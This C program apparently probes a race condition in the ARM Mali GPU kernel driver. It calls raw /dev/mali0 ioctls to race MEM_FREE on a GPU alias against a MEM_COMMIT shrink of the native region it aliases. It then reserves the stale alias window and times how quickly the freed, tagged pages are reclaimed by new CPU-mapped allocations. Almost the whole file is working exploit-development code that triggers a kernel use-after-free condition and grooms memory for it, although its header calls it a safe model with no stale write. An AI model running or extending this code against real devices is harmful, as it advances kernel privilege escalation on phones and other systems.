/*
 * mali_alias_reuse_timing_probe.c -- Measure how quickly pages freed by the
 * alias free/shrink race are reclaimed by new allocations.
 *
 * Safe model:
 *   1. Allocate a native 16-page region and tag source pages 8-15 uniquely.
 *   2. Create a GPU-only alias covering native pages 8-15.
 *   3. Win the proven MEM_FREE(alias) vs MEM_COMMIT(native->8) race.
 *   4. Try to reserve the old alias VA window with a zero-commit allocation so
 *      later reclaim allocations, if any, land elsewhere.
 *   5. Allocate 8-page CPU/GPU regions sequentially without freeing earlier
 *      ones and check when the freed tagged pages reappear.
 *
 * Outcome:
 *   - first_hit: how many allocations before any freed page reappears
 *   - first_disjoint_hit: how many allocations before a reclaim appears fully
 *     outside the old alias VA window
 *   - unique_pages: how many of the original 8 freed pages are recovered
 *
 * Safety:
 *   - fork + alarm
 *   - no GPU job submission / no stale-write attempt
 *   - bounded sequential allocations with full cleanup after each trial
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT  (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY   (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_GROW_ON_GPF      (1U << 9)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define PAGE_BYTES          4096U
#define NATIVE_PAGES        16U
#define SOURCE_OFFSET_PAGES 8U
#define SOURCE_PAGES        8U
#define RECLAIM_PAGES       8U
#define MAX_RECLAIM_ALLOCS  16
#define MAX_RACE_ITERS      20
#define SOURCE_ID_NONE      0xFFU
#define FULL_SOURCE_BITMAP  ((1U << SOURCE_PAGES) - 1U)
#define CANARY64            0xDEADBEEFCAFEBABEULL

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct reclaim_alloc {
    uint64_t gpu_va;
    uint64_t *cpu;
    uint8_t source_ids[RECLAIM_PAGES];
    unsigned source_bitmap;
    int source_page_count;
    int overlaps_alias;
};

struct attempt_result {
    int race_won;
    int reserved_window;
    int first_hit;
    int first_disjoint_hit;
    unsigned unique_bitmap;
    int allocs_used;
};

static int g_fd = -1;
static volatile int g_ready = 0;
static int g_commit_ret = -1;
static uint64_t g_alias_gpu_va = 0;
static uint64_t g_native_gpu_va = 0;

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED) {
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    }
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc_ext(int fd, uint64_t va_pages, uint64_t commit_pages,
                               uint64_t extent, uint32_t flags)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = va_pages;
    alloc.commit_pages = commit_pages;
    alloc.extent = extent;
    alloc.flags = flags;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint64_t mali_alloc_flags(int fd, uint64_t pages, uint32_t flags)
{
    return mali_alloc_ext(fd, pages, pages, pages, flags);
}

static int mali_commit(int fd, uint64_t gpu_va, uint64_t pages)
{
    struct kbase_uk_mem_commit commit;

    memset(&commit, 0, sizeof(commit));
    commit.header.id = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr = gpu_va;
    commit.pages = pages;
    mali_ioctl(fd, &commit, sizeof(commit));
    return commit.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_query query;

    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    mali_ioctl(fd, &query, sizeof(query));
    return query.value;
}

static uint64_t mali_alias(int fd, uint64_t src_gpu_va, uint64_t offset_pages,
                           uint64_t length_pages)
{
    struct base_mem_aliasing_info info;
    struct kbase_uk_mem_alias alias;

    memset(&info, 0, sizeof(info));
    info.handle = src_gpu_va;
    info.offset = offset_pages;
    info.length = length_pages;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length_pages;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&info;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free free_req;

    if (!gpu_va)
        return;
    memset(&free_req, 0, sizeof(free_req));
    free_req.header.id = KBASE_FUNC_MEM_FREE;
    free_req.gpu_addr = gpu_va;
    mali_ioctl(fd, &free_req, sizeof(free_req));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static int ranges_overlap(uint64_t start_a, uint64_t pages_a,
                          uint64_t start_b, uint64_t pages_b)
{
    uint64_t end_a = start_a + pages_a * PAGE_BYTES;
    uint64_t end_b = start_b + pages_b * PAGE_BYTES;

    return !(end_a <= start_b || end_b <= start_a);
}

static uint64_t source_tag(uint8_t source_id)
{
    return CANARY64 ^ ((uint64_t)(source_id + 1U) << 56);
}

static int source_tag_to_id(uint64_t value)
{
    uint8_t source_id;

    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        if (value == source_tag(source_id))
            return (int)source_id;
    }
    return -1;
}

static void fill_source_tags(uint8_t *cpu_base)
{
    size_t page;
    size_t word;
    size_t words_per_page = PAGE_BYTES / sizeof(uint64_t);

    for (page = 0; page < SOURCE_PAGES; page++) {
        uint64_t value = source_tag((uint8_t)page);
        uint64_t *page_cpu = (uint64_t *)(cpu_base + (SOURCE_OFFSET_PAGES + page) * PAGE_BYTES);

        for (word = 0; word < words_per_page; word++)
            page_cpu[word] = value;
    }
}

static int snapshot_source_pages(const uint64_t *cpu_base, size_t pages, uint8_t *source_ids)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);
    int count = 0;

    memset(source_ids, SOURCE_ID_NONE, pages);
    for (i = 0; i < pages; i++) {
        int source_id = source_tag_to_id(cpu_base[i * page_stride]);

        if (source_id >= 0) {
            source_ids[i] = (uint8_t)source_id;
            count++;
        }
    }
    return count;
}

static unsigned source_bitmap_from_ids(const uint8_t *source_ids, size_t pages)
{
    size_t i;
    unsigned bitmap = 0;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE)
            bitmap |= (1U << source_ids[i]);
    }
    return bitmap;
}

static void format_source_ids(unsigned bitmap, char *buf, size_t buf_len)
{
    size_t used = 0;
    unsigned source_id;

    if (!bitmap) {
        snprintf(buf, buf_len, "none");
        return;
    }

    buf[0] = '\0';
    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        int written;

        if (!(bitmap & (1U << source_id)))
            continue;
        written = snprintf(buf + used, buf_len - used, "%s%u",
                           used ? "," : "", source_id);
        if (written < 0 || (size_t)written >= buf_len - used)
            break;
        used += (size_t)written;
    }
}

static int verify_prereqs(int fd)
{
    uint64_t native_va;
    uint64_t alias_va;
    int shrink_with_alias;
    int shrink_without_alias;
    uint64_t commit_now;

    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va)
        return -1;

    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        mali_free(fd, native_va);
        return -1;
    }

    shrink_with_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    mali_free(fd, alias_va);
    shrink_without_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    commit_now = mali_query_commit(fd, native_va);
    mali_free(fd, native_va);

    if (shrink_with_alias == 0 || shrink_without_alias != 0 || commit_now != SOURCE_OFFSET_PAGES)
        return -1;
    return 0;
}

static void *thread_free(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    mali_free(g_fd, g_alias_gpu_va);
    return NULL;
}

static void *thread_commit(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, SOURCE_OFFSET_PAGES);
    return NULL;
}

static int reserve_alias_window(int fd, uint64_t alias_va, uint64_t *guard_va_out)
{
    uint64_t window_va;
    uint64_t window_commit;

    window_va = mali_alloc_ext(fd, SOURCE_PAGES, 0, SOURCE_PAGES,
                               BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                               BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                               BASE_MEM_GROW_ON_GPF);
    if (!window_va)
        return 0;

    window_commit = mali_query_commit(fd, window_va);
    if (window_va == alias_va && window_commit == 0) {
        *guard_va_out = window_va;
        return 1;
    }

    printf("[*] reserve miss: zero-commit window landed at 0x%llx commit=%llu instead of stale alias 0x%llx\n",
           (unsigned long long)window_va,
           (unsigned long long)window_commit,
           (unsigned long long)alias_va);
    mali_free(fd, window_va);
    return 0;
}

static int alloc_reclaim_candidate(int fd, uint64_t alias_va, struct reclaim_alloc *slot)
{
    memset(slot, 0, sizeof(*slot));
    slot->gpu_va = mali_alloc_flags(fd, RECLAIM_PAGES,
                                    BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                    BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                    BASE_MEM_GROW_ON_GPF);
    if (!slot->gpu_va)
        return -1;

    slot->cpu = mali_cpu_map(fd, slot->gpu_va, RECLAIM_PAGES * PAGE_BYTES);
    if (slot->cpu == MAP_FAILED) {
        slot->cpu = NULL;
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
        return -1;
    }

    slot->source_page_count = snapshot_source_pages(slot->cpu, RECLAIM_PAGES, slot->source_ids);
    slot->source_bitmap = source_bitmap_from_ids(slot->source_ids, RECLAIM_PAGES);
    slot->overlaps_alias = ranges_overlap(slot->gpu_va, RECLAIM_PAGES, alias_va, SOURCE_PAGES);
    return 0;
}

static void free_reclaim_candidate(int fd, struct reclaim_alloc *slot)
{
    if (slot->cpu) {
        munmap(slot->cpu, RECLAIM_PAGES * PAGE_BYTES);
        slot->cpu = NULL;
    }
    if (slot->gpu_va) {
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
    }
}

static int run_reuse_attempt(int fd, int iter, struct attempt_result *result)
{
    uint64_t native_va = 0;
    uint64_t alias_va = 0;
    uint64_t guard_va = 0;
    uint8_t *native_cpu = MAP_FAILED;
    struct reclaim_alloc reclaim_allocs[MAX_RECLAIM_ALLOCS];
    int i;

    memset(result, 0, sizeof(*result));
    memset(reclaim_allocs, 0, sizeof(reclaim_allocs));

    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va) {
        printf("[-] iter %d: native alloc failed\n", iter);
        return -1;
    }

    native_cpu = mali_cpu_map(fd, native_va, NATIVE_PAGES * PAGE_BYTES);
    if (native_cpu == MAP_FAILED) {
        printf("[-] iter %d: native mmap failed errno=%d\n", iter, errno);
        return -1;
    }
    fill_source_tags(native_cpu);
    __sync_synchronize();

    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        printf("[-] iter %d: alias failed\n", iter);
        return -1;
    }

    g_fd = fd;
    g_native_gpu_va = native_va;
    g_alias_gpu_va = alias_va;
    g_commit_ret = -1;
    g_ready = 0;

    {
        pthread_t t_free;
        pthread_t t_commit;

        pthread_create(&t_free, NULL, thread_free, NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);
        usleep(iter % 7);
        g_ready = 1;
        pthread_join(t_free, NULL);
        pthread_join(t_commit, NULL);
    }
    alias_va = 0;

    if (g_commit_ret != 0) {
        printf("[*] iter %d: race miss (commit ret=%d)\n", iter, g_commit_ret);
        goto cleanup;
    }

    result->race_won = 1;
    printf("[!!!] iter %d: race won (commit_now=%llu old_alias=0x%llx)\n",
           iter,
           (unsigned long long)mali_query_commit(fd, native_va),
           (unsigned long long)g_alias_gpu_va);

    if (reserve_alias_window(fd, g_alias_gpu_va, &guard_va)) {
        result->reserved_window = 1;
        printf("[+] iter %d: reserved stale alias window at 0x%llx with commit=0\n",
               iter, (unsigned long long)guard_va);
    }

    for (i = 0; i < MAX_RECLAIM_ALLOCS; i++) {
        unsigned new_bitmap;
        char ids_buf[64];

        if (alloc_reclaim_candidate(fd, g_alias_gpu_va, &reclaim_allocs[i]) < 0) {
            printf("[-] iter %d: reclaim alloc %d failed\n", iter, i + 1);
            return -1;
        }

        new_bitmap = reclaim_allocs[i].source_bitmap & ~result->unique_bitmap;
        result->unique_bitmap |= reclaim_allocs[i].source_bitmap;
        result->allocs_used = i + 1;
        if (reclaim_allocs[i].source_page_count > 0 && result->first_hit == 0)
            result->first_hit = i + 1;
        if (reclaim_allocs[i].source_page_count > 0 &&
            !reclaim_allocs[i].overlaps_alias &&
            result->first_disjoint_hit == 0)
            result->first_disjoint_hit = i + 1;

        format_source_ids(reclaim_allocs[i].source_bitmap, ids_buf, sizeof(ids_buf));
        printf("[*] iter %d: alloc=%d gpu_va=0x%llx overlap=%s tagged=%d ids=%s new=%d cumulative=%d\n",
               iter,
               i + 1,
               (unsigned long long)reclaim_allocs[i].gpu_va,
               reclaim_allocs[i].overlaps_alias ? "yes" : "no",
               reclaim_allocs[i].source_page_count,
               ids_buf,
               __builtin_popcount(new_bitmap),
               __builtin_popcount(result->unique_bitmap));

        if (result->unique_bitmap == FULL_SOURCE_BITMAP)
            break;
    }

    printf("[*] iter %d summary: reserve=%s first_hit=%d first_disjoint_hit=%d unique_pages=%d/%d bitmap=0x%02x allocs=%d\n",
           iter,
           result->reserved_window ? "yes" : "no",
           result->first_hit,
           result->first_disjoint_hit,
           __builtin_popcount(result->unique_bitmap),
           SOURCE_PAGES,
           result->unique_bitmap,
           result->allocs_used);

cleanup:
    for (i = 0; i < MAX_RECLAIM_ALLOCS; i++)
        free_reclaim_candidate(fd, &reclaim_allocs[i]);
    if (guard_va)
        mali_free(fd, guard_va);
    if (alias_va)
        mali_free(fd, alias_va);
    if (native_cpu != MAP_FAILED)
        munmap(native_cpu, NATIVE_PAGES * PAGE_BYTES);
    if (native_va)
        mali_free(fd, native_va);
    return 0;
}

static void run_probe(void)
{
    int i;
    int race_wins = 0;
    int reuse_hits = 0;
    int disjoint_hits = 0;
    int reserved_hits = 0;
    int total_first_hit = 0;
    int total_first_disjoint_hit = 0;
    int total_unique_pages = 0;

    printf("=== mali_alias_reuse_timing_probe ===\n");
    printf("Winning alias free/shrink and measuring how many new allocations are needed\n");
    printf("before the freed tagged pages reappear in CPU-visible reclaim buffers.\n\n");

    g_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (g_fd < 0) {
        perror("open /dev/mali0");
        return;
    }
    if (mali_init(g_fd) < 0) {
        perror("mali_init");
        close(g_fd);
        return;
    }

    if (verify_prereqs(g_fd) < 0) {
        printf("[-] alias/free/shrink preflight failed\n");
        close(g_fd);
        return;
    }

    for (i = 1; i <= MAX_RACE_ITERS; i++) {
        struct attempt_result result;

        if (run_reuse_attempt(g_fd, i, &result) < 0) {
            printf("\n[-] Probe aborted on iter %d due to setup error\n", i);
            close(g_fd);
            return;
        }

        if (!result.race_won)
            continue;

        race_wins++;
        if (result.reserved_window)
            reserved_hits++;
        total_unique_pages += __builtin_popcount(result.unique_bitmap);

        if (result.first_hit > 0) {
            reuse_hits++;
            total_first_hit += result.first_hit;
        }
        if (result.first_disjoint_hit > 0) {
            disjoint_hits++;
            total_first_disjoint_hit += result.first_disjoint_hit;
        }
    }

    printf("\n=== summary ===\n");
    printf("[*] race wins: %d/%d\n", race_wins, MAX_RACE_ITERS);
    printf("[*] stale alias window reserved with commit=0: %d/%d race wins\n", reserved_hits, race_wins);
    printf("[*] any reclaim hit: %d/%d race wins\n", reuse_hits, race_wins);
    printf("[*] disjoint reclaim hit: %d/%d race wins\n", disjoint_hits, race_wins);
    if (reuse_hits > 0) {
        printf("[*] avg first_hit allocation: %.2f\n",
               (double)total_first_hit / (double)reuse_hits);
    }
    if (disjoint_hits > 0) {
        printf("[*] avg first_disjoint_hit allocation: %.2f\n",
               (double)total_first_disjoint_hit / (double)disjoint_hits);
    }
    if (race_wins > 0) {
        printf("[*] avg unique reclaimed pages per race win: %.2f/%u\n",
               (double)total_unique_pages / (double)race_wins,
               SOURCE_PAGES);
    }

    close(g_fd);
}

int main(void)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(90);
        run_probe();
        _exit(0);
    }

    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("[!] Child killed by signal %d\n", WTERMSIG(status));
    return 0;
}
